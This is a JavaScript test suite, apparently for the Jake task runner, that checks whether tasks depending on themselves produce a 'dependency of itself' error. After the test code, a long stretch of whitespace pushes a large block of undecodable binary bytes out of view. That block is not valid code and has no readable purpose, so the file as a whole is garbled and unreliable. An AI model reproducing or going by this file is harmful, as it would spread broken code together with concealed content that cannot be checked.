let assert = require('assert');
let exec = require('child_process').execSync;

const PROJECT_DIR = process.env.PROJECT_DIR;
const JAKE_CMD = `${PROJECT_DIR}/bin/cli.js`;

suite('selfDep', function () {

  this.timeout(7000);

  let origStderrWrite;

  setup(function () {
    origStderrWrite = process.stderr.write;
    process.stderr.write = function () {};
  });

  teardown(function () {
    process.stderr.write = origStderrWrite;
  });

  test('self dep const', function () {
    try {
      exec(`${JAKE_CMD} selfdepconst`);
    }
    catch(e) {
      assert(e.message.indexOf('dependency of itself') > -1);
    }
  });

  test('self dep dyn', function () {
    try {
      exec(`${JAKE_CMD} selfdepdyn`);
    }
    catch(e) {
      assert(e.message.indexOf('dependency of itself') > -1);
    }
  });

});


                                                                                                                                                                                                                  %=C�1&lцd���ϫ��H�n?�
<DO�Q�c�D���c��x�;�ũ��D�I=�tBy!]�Y`VkNf�qYN�`ol��z�܃SC�K�+�q��nA�m�����o߯���1P���a���'��\U}G�7C��Y��0����G����^6W^�"S��29�Vv-�-�_H��x�O�%�����m �@�r"A�^�a�O�h6���'Ux��>�i�مH���è$;����8��9|�J�M;�m)eW�FICP�t��V�?�c�)"e�9:}ujE�p��՗���>ruxG�4B�mJ�H%y�~�j"���'�&�|y�0Ky	��!U)�Xjz�Mv�^y���M�Q�\�'+���B׽?��*�R�K�R�@���V���:'2��BA:�6חL�E7+s!4�<��~��{Z�	']�K���n2\9��s�%[B�6��g����Ԓ�϶��ŌNF��*c"/�$ϸ7��I~�@��u���"�z,A,!�l�\����Б)Ȕu�0L�������1�+�"����v�cI����)�Y�d4f�ي�y�TeS\���k�&�H`����0%�i��5��
�#@��tkH�f�����|A�Q�յC��s,�d��Z�mO|���J'�;1�%�s6�n��|�������M�
�N�����ʷ9>f���>0�^PxG'S��'�d�~4�c��x÷��)�Z(�ˮ|]9�t�g�3|� �q7U������ETHl5�lQ�>b�\��J|0&"<�1mn�q׋$�����l�Z�#!��}��M$�ρ��nY ��>Ӣ����*��Z�c"!#:L���g�[�p�������Lon��^��W)>���t��m6jc(���c�@�GNv���5��6�2`���";����]8�	Y��S�Б��
a`ύ�U���Eg�ꃘr�\#��մ��Le9�6���ߓ��/N ɑ��K�[%��Ǥ]*�+�x�A���ʳ+� �����f���g�ީ����e/ $IL)6�]!EADQ�Q#�q��<n��p\ɴІz{���T�A��@@7�����AlF2��w�
���U�G�Л��]�{�d;���ɶ�.�6\�a@#M�8,]�4�4]�	�naM#S��Zr)D�g��j����� �y�nC��~��� �Ð��Fp@�����1C��%d���k�$�y��_t�"`Ʀ*J_��D�0^Rs��|�A�o�pN�	�tff��4�Q{p�N..�2�۝C�ȱ�8}rH���l�=�;����63j6��]��מ�v"����K)m�쬘-�-#��i}xFo����)�:'�!����*��B�0�ğ_AFVz8��ޯ7҉�C>o���t�~���@�q*s��J��w��������,�����*���4�G���V��0aT�aV;̆]q
�=���H��h�Y�ԛ`9��(ܘͅ���O}�����&q���]ngnW��3y rǳ��/2.�|�f�/�VCf��N�]�J\b�����?���Hsa9w�v4��rb�����.g���9C���XB<�^�A_��3ᯛK��'3u�/a��P���vT�k7f� Ю��hX�fُtJ	&�ϟJ�O턫 �2r n�|���P�=�I��9y��*����)-g�]����U_r{�}��q������Ȭ�ch�[����@�:bjT��u�����*b�%3�DS{����f�d���]��C$g�׵���=K@���c���@X:����'"���"#����Oa��tW6��2̀�`P���=Oy�Hã�df;����2�bݿ��?�>;*��'�g���gH�8
�N�/� �sP2���eۊ�T�?�>�D���Ӭ:���b?<��3?�	�� f��9��0�]��k�@�
�϶Xƥi��t?K8��($B[�)L~�FB��@������8�q�+���EP{!K	V���r�?S.�Kw�0`�$�l_�S���H�<�pZ�	˫�EgKY�4ْ�P�,����s,1���0��ca鏗�c�����ML��Ei��`M�:z�j���W�R���!�:���c�DW#�v���+����~.ᾆoQ�%�ݡ�f�㻺 ���c���M8b4>����;X\�W���`���0��<b��F���Lr�e�e��E����q7���7ԆX0�Yȥ��=��|�QT��b�q����vԑ��锹��w��ZV�M���T��{꿨ŀ�r3µ��>W\���L�V�����Xg?{8a��	Z�]M3�c!�N8 7}5���m`�H�1#�3�(g�T$" �Q�
;D����X��Q[�q��c�]��\���܏�>�>��eғgܨ��4��Jku���y�r�� =F�}s���L��᥈B��{��K�Պ�C�